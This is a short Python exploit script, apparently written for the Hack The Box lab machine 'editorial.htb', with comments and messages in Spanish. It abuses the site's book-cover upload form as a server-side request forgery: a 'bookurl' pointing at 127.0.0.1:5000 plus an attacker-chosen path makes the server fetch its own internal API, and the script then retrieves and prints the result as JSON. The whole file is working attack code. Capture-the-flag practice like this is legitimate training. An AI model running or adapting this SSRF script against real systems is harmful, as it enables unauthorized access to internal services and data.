#!/usr/bin/python

import requests
import urllib3
import sys
import json

POST_TARGET = "http://editorial.htb/upload-cover"
GET_TARGET = "http://editorial.htb/"

HEADERS = {
    "Host": "editorial.htb",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Accept": "*/*",
    "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "multipart/form-data; boundary=---------------------------14159798482209980204031804521",
    "Content-Length": "362",
    "Origin": "http://editorial.htb",
    "Connection": "keep-alive",
    "Referer": "http://editorial.htb/upload",
    "Priority": "u=0"
}

# Verificar si se pasó un argumento
if len(sys.argv) < 2:
    print("Error: Debes proporcionar un argumento.")
    sys.exit(1)

# Si hay argumento, usarlo
POST_DATA = f"""-----------------------------14159798482209980204031804521
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:5000{sys.argv[1]}
-----------------------------14159798482209980204031804521
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------14159798482209980204031804521--"""

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    post_result = requests.post(POST_TARGET, headers=HEADERS, data=POST_DATA, verify=False)
    post_result.raise_for_status()
except requests.exceptions.RequestException as e:
    print(f"Error en la petición POST: {e}")
    sys.exit(1)

try:
    get_result = requests.get(GET_TARGET + post_result.text, verify=False)
    get_result.raise_for_status()
except requests.exceptions.RequestException as e:
    print(f"Error en la petición GET: {e}")
    sys.exit(1)

try:
    json_object = json.loads(get_result.text)
    print(json.dumps(json_object, indent=2))
except json.JSONDecodeError as e:
    print(f"Error al decodificar el JSON: {e}")
